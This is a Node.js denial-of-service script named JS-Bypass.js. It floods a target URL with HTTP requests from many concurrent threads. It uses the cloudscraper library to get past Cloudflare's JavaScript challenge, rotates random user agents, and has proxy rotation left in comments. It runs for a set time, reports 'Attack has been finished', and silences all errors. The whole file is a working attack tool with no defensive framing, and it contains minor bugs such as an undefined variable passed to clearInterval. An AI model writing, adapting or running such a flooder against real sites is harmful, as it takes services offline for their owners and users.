const EventEmitter = require('events');
var cloudscraper = require('cloudscraper');
var chalk = require('chalk');
var fs = require('fs');
var dateTime = require('node-datetime');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

if(process.argv.length < 7)
{
    Logger("Wrong usage!");
    Logger("Usage: node JS-Bypass.js [URL] [TIME] [USERAGENTS] [METHOD]");
    process.exit(0);
}

var target = process.argv[2];
var time = process.argv[3];
var useragentFile = process.argv[4];
var reqMethod = process.argv[5];
var threads = process.argv[6];

const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
//const proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n');

setInterval(function() {

    setTimeout(() => {
        Logger("Attack has been finished.");
        process.exit(1);
    }, time * 1000);

    for (var i = 0; i < threads; i++) {
            let userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            //let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var options = {
                method: reqMethod,
                url: target,
                resolveWithFullResponse: true,
                challengesToSolve: 1,
                followAllRedirects: true
            };
            cloudscraper(options);
    }

}, 0);
setTimeout(() => clearInterval(int), time * 1000);

function Logger(string)
{
    var dt = dateTime.create();
    var formatted = dt.format('H:M:S');
    var log = console.log;
    log(chalk.yellow("[" + formatted + "] ") + chalk.blue(string));
}

process.on('uncaughtException', function(e) {
	// x)
});

process.on('unhandledRejection', function(e) {
	// x)
});